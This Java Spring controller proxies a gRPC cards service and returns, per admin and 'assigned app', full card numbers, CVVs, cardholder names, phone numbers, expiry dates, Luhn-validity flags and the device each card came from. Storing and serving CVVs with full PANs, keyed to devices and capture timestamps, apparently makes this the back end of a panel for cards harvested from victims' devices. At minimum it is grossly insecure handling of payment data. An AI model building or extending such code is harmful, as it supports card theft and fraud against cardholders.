package com.admingateway.web;

import com.admingateway.grpc.CardsGrpcClient;
import com.admingateway.grpc.cards.ListCardsRequest;
import com.admingateway.security.SessionValidator;
import io.grpc.Status;
import io.grpc.StatusRuntimeException;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

@RestController
@RequestMapping("/cards")
public class CardsRestProxyController {

    private final CardsGrpcClient grpc;
    private final SessionValidator sessionValidator;

    public CardsRestProxyController(CardsGrpcClient grpc, SessionValidator sessionValidator) {
        this.grpc = grpc;
        this.sessionValidator = sessionValidator;
    }

    @GetMapping
    public ResponseEntity<Map<String, Object>> list(@CookieValue(value = "asid", required = false) String asid,
                                    @RequestHeader(value = "X-Session-Id", required = false) String sidHeader,
                                    @RequestParam(value = "deviceId", required = false) String deviceId,
                                    @RequestParam(value = "q", required = false) String q,
                                    @RequestParam(value = "network", required = false) String network,
                                    @RequestParam(value = "page", required = false) Integer page,
                                    @RequestParam(value = "size", required = false) Integer size) {
        String sid = (sidHeader != null && !sidHeader.isBlank()) ? sidHeader : asid;
        var v = sessionValidator.validate(sid);
        if (!v.active()) return ResponseEntity.status(401).build();
        // Consistent guard: if admin has no assigned app, return 400 with clear message
        if (v.appId()==null || v.appId().isBlank()) {
            return ResponseEntity.badRequest().body(Map.of(
                "error", "missing_app_id",
                "message", "Admin has no assigned app. Set Assigned App for this admin in Admin panel and retry."
            ));
        }

        var req = buildCardsRequest(v, new CardFilters(deviceId, q, network), page, size);

        try {
            final var resp = safeList(req);
            List<Map<String, Object>> items = resp.getItemsList().stream().map(it -> {
                Map<String, Object> m = new HashMap<>();
                m.put("id", it.getId());
                m.put("bin", nullIfBlank(it.getBin()));
                m.put("last4", nullIfBlank(it.getLast4()));
                m.put("expiryMonth", it.getExpiryMonth());
                m.put("expiryYear", it.getExpiryYear());
                m.put("luhnValid", it.getLuhnValid());
                m.put("network", nullIfBlank(it.getNetwork()));
                m.put("productType", nullIfBlank(it.getProductType()));
                m.put("issuer", nullIfBlank(it.getIssuer()));
                m.put("country", nullIfBlank(it.getCountry()));
                m.put("eventTimestamp", it.getEventTimestampMs());
                m.put("deviceId", it.getDeviceId());
                m.put("adminId", it.getAdminId());
                m.put("appId", it.getAppId());
                m.put("nameOnCard", nullIfBlank(it.getNameOnCard()));
                m.put("phoneNumber", nullIfBlank(it.getPhoneNumber()));
                m.put("cvv", nullIfBlank(it.getCvv()));
                m.put("pan", nullIfBlank(it.getPan()));
                return m;
            }).toList();

            Map<String, Object> out = new HashMap<>();
            out.put("items", items);
            out.put("page", resp.getPage());
            out.put("size", resp.getSize());
            out.put("count", resp.getCount());
            return ResponseEntity.ok(out);
        } catch (org.springframework.web.server.ResponseStatusException ex) {
            throw ex; // already mapped
        } catch (Exception ex) {
            throw new org.springframework.web.server.ResponseStatusException(
                    org.springframework.http.HttpStatus.INTERNAL_SERVER_ERROR,
                    "Cards gateway mapping error", ex
            );
        }
    }

    private com.admingateway.grpc.cards.ListCardsResponse safeList(ListCardsRequest req) {
        try {
            return grpc.list(req);
        } catch (StatusRuntimeException e) {
            Status.Code code = e.getStatus().getCode();
            // Fallback: for connectivity/timeouts return empty page instead of error
            int fallbackSize = req.getSize() <= 0 ? 0 : Math.max(1, Math.min(200, req.getSize()));
            if (code == Status.Code.UNAVAILABLE || code == Status.Code.DEADLINE_EXCEEDED) {
                return com.admingateway.grpc.cards.ListCardsResponse.newBuilder()
                        .setPage(Math.max(0, req.getPage()))
                        .setSize(fallbackSize)
                        .setCount(0)
                        .build();
            }
            // For other upstream errors, propagate as 500 with clear message
            throw new org.springframework.web.server.ResponseStatusException(
                    org.springframework.http.HttpStatus.INTERNAL_SERVER_ERROR,
                    "Cards service error: " + code.name()
            );
        }
    }

    private ListCardsRequest buildCardsRequest(SessionValidator.Result session,
                                               CardFilters filters,
                                               Integer page,
                                               Integer size) {
        boolean explicitUnpaged = size != null && size <= 0;
        boolean unpaged = (page == null && size == null) || explicitUnpaged;
        int safePage = page == null ? 0 : Math.max(0, page);
        int safeSize = size == null ? 50 : Math.max(1, Math.min(200, size));
        return ListCardsRequest.newBuilder()
                .setAdminId(session.adminId() == null ? "" : session.adminId())
                .setAppId(session.appId() == null ? "" : session.appId())
                .setDeviceId(filters.deviceId() == null ? "" : filters.deviceId())
                .setQ(filters.q() == null ? "" : filters.q())
                .setNetwork(filters.network() == null ? "" : filters.network())
                .setPage(unpaged ? 0 : safePage)
                .setSize(unpaged ? 0 : safeSize)
                .build();
    }

    private record CardFilters(String deviceId, String q, String network) {}

    private static String nullIfBlank(String s) {
        return (s == null || s.isBlank()) ? null : s;
    }
}
